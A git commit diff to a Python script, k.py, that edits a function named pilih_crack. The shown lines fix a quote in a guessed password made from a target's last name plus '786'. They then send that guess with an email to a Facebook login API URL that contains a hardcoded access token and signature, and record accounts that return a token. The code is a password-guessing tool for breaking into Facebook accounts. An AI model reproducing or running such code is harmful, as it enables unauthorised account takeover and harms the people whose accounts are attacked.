48f5248bbd9fd932af2a270cedd446b27beb70ac
Tahir520 <36207064+Tahir520@users.noreply.github.com>
2020-11-20 23:15:58 +0500

    Update k.py

--- k.py
+++ k.py
@@ -836,7 +836,7 @@ def pilih_crack():
 																									cek.close()
 																									cekpoint.append(user+pass11)
 																								else:
-																									pass12 = b['last_name']+'786''
+																									pass12 = b['last_name']+'786'
 																									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass12)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 																									s = json.load(data)
 																									if 'access_token' in s:
